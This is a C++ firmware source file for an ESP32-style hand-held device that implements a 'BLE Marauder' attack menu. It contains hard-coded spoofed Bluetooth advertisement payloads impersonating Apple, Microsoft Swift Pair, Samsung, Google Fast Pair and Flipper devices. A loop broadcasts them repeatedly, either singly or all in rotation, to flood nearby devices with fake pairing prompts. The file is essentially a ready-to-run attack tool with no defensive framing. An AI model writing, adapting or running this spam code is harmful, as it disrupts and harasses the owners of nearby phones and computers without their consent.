#include "marauder_ble.h"
#include "utils.h"
#include "icons.h"
#include "menu.h"
#include "config.h"
#include "pins.h"
#include <U8g2lib.h>
#include <NimBLEDevice.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

enum BLEAttackType {
  BLE_ATTACK_NONE,
  BLE_ATTACK_SOUR_APPLE,
  BLE_ATTACK_APPLE_JUICE,
  BLE_ATTACK_SWIFTPAIR,
  BLE_ATTACK_SAMSUNG,
  BLE_ATTACK_GOOGLE,
  BLE_ATTACK_FLIPPER,
  BLE_ATTACK_ALL
};

BLEAttackType currentBLEAttack = BLE_ATTACK_NONE;
bool bleAttackRunning = false;
unsigned long bleLastSend = 0;
int bleSelection = 0;
bool bleInitialized = false;

NimBLEServer* pServer = nullptr;
NimBLEAdvertising* pAdvertising = nullptr;

void drawBleMenu() {
  const char* items[] = {
    "🍎 Sour Apple",
    "🧃 Apple Juice",
    "📱 Swiftpair Spam",
    "📱 Samsung Spam",
    "📱 Google Spam",
    "🦈 Flipper Spam",
    "💥 BLE Spam All",
    "⏹️ Stop Attack",
    "< Back"
  };
  int count = 9;

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawBox(0, 0, 128, 12);
  u8g2.setDrawColor(0);
  u8g2.drawXBMP(2, 1, 10, 10, icon_ble);
  u8g2.drawStr(15, 9, "BLE Attacks");
  u8g2.setDrawColor(1);
  u8g2.drawLine(0, 12, 128, 12);

  if (bleAttackRunning) {
    u8g2.setCursor(100, 9);
    u8g2.print("🔴");
  } else {
    u8g2.setCursor(100, 9);
    u8g2.print("⚪");
  }

  int visibleItems = 5;
  int startIdx = 0;
  if (bleSelection >= visibleItems) {
    startIdx = bleSelection - visibleItems + 1;
  }
  if (startIdx > count - visibleItems) {
    startIdx = count - visibleItems;
  }
  if (startIdx < 0) startIdx = 0;

  for (int i = 0; i < visibleItems && (startIdx + i) < count; i++) {
    int idx = startIdx + i;
    int y = 18 + i * 9;

    if (idx == bleSelection) {
      u8g2.setDrawColor(0);
      u8g2.drawBox(0, y - 1, 128, 10);
      u8g2.setDrawColor(1);
      u8g2.setCursor(3, y + 1);
      u8g2.print(">");
      u8g2.setCursor(12, y + 1);
    } else {
      u8g2.setCursor(3, y + 1);
      u8g2.print(" ");
      u8g2.setCursor(12, y + 1);
    }
    u8g2.print(items[idx]);
  }

  if (startIdx > 0) {
    u8g2.setCursor(120, 16);
    u8g2.print("^");
  }
  if (startIdx + visibleItems < count) {
    u8g2.setCursor(120, 60);
    u8g2.print("v");
  }

  u8g2.sendBuffer();
}

void initBLE() {
  if (bleInitialized) return;
  
  Serial.println("🔵 Initializing NimBLE...");
  NimBLEDevice::deinit();
  delay(100);
  NimBLEDevice::init("");
  bleInitialized = true;
  
  pServer = NimBLEDevice::createServer();
  if (pServer) {
    pAdvertising = pServer->getAdvertising();
    Serial.println("✅ NimBLE Server created");
  } else {
    Serial.println("❌ Failed to create NimBLE server");
  }
}

void sendBLEPayload(const char* deviceName, uint8_t* payload, size_t len) {
  if (!bleInitialized || !pAdvertising) {
    initBLE();
    if (!pAdvertising) return;
  }
  
  if (len > 31) {
    Serial.println("⚠️ Payload too long, skipping");
    return;
  }
  
  pAdvertising->stop();
  delay(20);
  
  NimBLEAdvertisementData advData;
  advData.setName(deviceName);
  
  if (payload != NULL && len > 0 && len <= 31) {
    advData.addData(payload, len);
  }
  
  advData.setFlags(0x06);
  
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->setScanResponseData(advData);
  
  pAdvertising->start();
  delay(60);
  pAdvertising->stop();
  delay(10);
}

void sendSourApple() {
  const char* name = "AirDrop";
  uint8_t payload[] = {
    0x0A, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC0,
    0x27, 0x01, 0x02, 0x03
  };
  sendBLEPayload(name, payload, sizeof(payload));
}

void sendAppleJuice() {
  const char* name = "Apple TV";
  uint8_t payload[] = {
    0x14, 0xFF, 0x4C, 0x00, 0x07, 0x0F, 0x00,
    0x20, 0x02, 0xAC, 0x90, 0x85, 0x75, 0x94,
    0x65, 0x01, 0x02, 0x03, 0x04, 0x05, 0x00
  };
  sendBLEPayload(name, payload, sizeof(payload));
}

void sendSwiftpair() {
  const char* name = "ESPN";
  uint8_t payload[] = {
    0x03, 0x02, 0x80, 0x30,
    0x05, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80
  };
  sendBLEPayload(name, payload, sizeof(payload));
}

void sendSamsung() {
  const char* name = "Samsung Galaxy";
  uint8_t payload[] = {
    0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02,
    0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
    0x02
  };
  sendBLEPayload(name, payload, sizeof(payload));
}

void sendGoogle() {
  const char* name = "Google Fast Pair";
  uint8_t payload[] = {
    0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE, 0x00, 0xB7, 0x27,
    0x02, 0x0A, 0x00
  };
  sendBLEPayload(name, payload, sizeof(payload));
}

void sendFlipper() {
  const char* name = "Flipper Zero";
  uint8_t payload[] = {
    0x02, 0x01, 0x06,
    0x03, 0x02, 0x80, 0x30,
    0x05, 0xFF, 0xBA, 0x0F, 0x4C, 0x75
  };
  sendBLEPayload(name, payload, sizeof(payload));
}

void sendSingleAttack(BLEAttackType attack) {
  switch (attack) {
    case BLE_ATTACK_SOUR_APPLE: sendSourApple(); break;
    case BLE_ATTACK_APPLE_JUICE: sendAppleJuice(); break;
    case BLE_ATTACK_SWIFTPAIR: sendSwiftpair(); break;
    case BLE_ATTACK_SAMSUNG: sendSamsung(); break;
    case BLE_ATTACK_GOOGLE: sendGoogle(); break;
    case BLE_ATTACK_FLIPPER: sendFlipper(); break;
    default: break;
  }
}

void marauderBleSetup() {
  currentBLEAttack = BLE_ATTACK_NONE;
  bleAttackRunning = false;
  bleSelection = 0;
  bleInitialized = false;
  pServer = nullptr;
  pAdvertising = nullptr;
  clearPopup();

  showPopupMessage("🔵 BLE Marauder", "SELECT: Start Attack", "BACK: Exit");
  delay(1500);

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawXBMP(56, 5, 16, 16, icon_ble);
  CenteredStr(25, "BLE Marauder");
  CenteredStr(40, "SELECT: Start Attack");
  CenteredStr(55, "BACK: Exit");
  u8g2.sendBuffer();
}

void marauderBleLoop() {
  if (drawPopupIfActive()) {
    delay(50);
    return;
  }
  
  if (bleAttackRunning) {
    unsigned long now = millis();
    if (now - bleLastSend > 500) {
      bleLastSend = now;
      
      switch (currentBLEAttack) {
        case BLE_ATTACK_SOUR_APPLE: 
          sendSourApple(); 
          break;
        case BLE_ATTACK_APPLE_JUICE: 
          sendAppleJuice(); 
          break;
        case BLE_ATTACK_SWIFTPAIR: 
          sendSwiftpair(); 
          break;
        case BLE_ATTACK_SAMSUNG: 
          sendSamsung(); 
          break;
        case BLE_ATTACK_GOOGLE: 
          sendGoogle(); 
          break;
        case BLE_ATTACK_FLIPPER: 
          sendFlipper(); 
          break;
        case BLE_ATTACK_ALL: {
          static int allIndex = 0;
          BLEAttackType attacks[] = {
            BLE_ATTACK_SOUR_APPLE,
            BLE_ATTACK_APPLE_JUICE,
            BLE_ATTACK_SWIFTPAIR,
            BLE_ATTACK_SAMSUNG,
            BLE_ATTACK_GOOGLE,
            BLE_ATTACK_FLIPPER
          };
          sendSingleAttack(attacks[allIndex % 6]);
          allIndex++;
          break;
        }
        default: break;
      }
    }

    if (isButtonPressed(BTN_BACK)) {
      bleAttackRunning = false;
      currentBLEAttack = BLE_ATTACK_NONE;
      if (bleInitialized) {
        NimBLEDevice::deinit();
        bleInitialized = false;
        pServer = nullptr;
        pAdvertising = nullptr;
      }
      drawBleMenu();
    }
    return;
  }

  drawBleMenu();

  if (isButtonPressed(BTN_UP)) {
    bleSelection--;
    if (bleSelection < 0) bleSelection = 8;
    drawBleMenu();
  }
  
  if (isButtonPressed(BTN_DOWN)) {
    bleSelection++;
    if (bleSelection > 8) bleSelection = 0;
    drawBleMenu();
  }
  
  if (isButtonPressed(BTN_SELECT)) {
    switch (bleSelection) {
      case 0: currentBLEAttack = BLE_ATTACK_SOUR_APPLE; break;
      case 1: currentBLEAttack = BLE_ATTACK_APPLE_JUICE; break;
      case 2: currentBLEAttack = BLE_ATTACK_SWIFTPAIR; break;
      case 3: currentBLEAttack = BLE_ATTACK_SAMSUNG; break;
      case 4: currentBLEAttack = BLE_ATTACK_GOOGLE; break;
      case 5: currentBLEAttack = BLE_ATTACK_FLIPPER; break;
      case 6: currentBLEAttack = BLE_ATTACK_ALL; break;
      case 7: 
        bleAttackRunning = false; 
        currentBLEAttack = BLE_ATTACK_NONE; 
        if (bleInitialized) {
          NimBLEDevice::deinit();
          bleInitialized = false;
          pServer = nullptr;
          pAdvertising = nullptr;
        }
        showPopupMessage("⏹️ Attack Stopped", "", "");
        delay(800);
        drawBleMenu(); 
        return;
      case 8: 
        marauderBleCleanup();
        exitModule(); 
        return;
    }
    bleAttackRunning = true;
    bleLastSend = millis();
    initBLE();
    char attackName[30];
    const char* attackNames[] = {"Sour Apple", "Apple Juice", "Swiftpair", "Samsung", "Google", "Flipper", "ALL"};
    snprintf(attackName, sizeof(attackName), "🔴 %s", attackNames[bleSelection]);
    showPopupMessage(attackName, "Spamming BLE...", "BACK to stop");
    delay(1000);
  }
  
  if (isButtonPressed(BTN_BACK)) {
    marauderBleCleanup();
    exitModule();
    return;
  }

  delay(20);
}

void marauderBleCleanup() {
  Serial.println("🧹 BLE Marauder cleanup...");
  
  bleAttackRunning = false;
  currentBLEAttack = BLE_ATTACK_NONE;
  
  if (bleInitialized) {
    if (pAdvertising) {
      pAdvertising->stop();
    }
    NimBLEDevice::deinit();
    bleInitialized = false;
    pServer = nullptr;
    pAdvertising = nullptr;
    Serial.println("  ✅ NimBLE deinitialized");
  }
  
  bleSelection = 0;
  bleLastSend = 0;
  clearPopup();
  
  Serial.println("✅ BLE Marauder cleanup complete");
}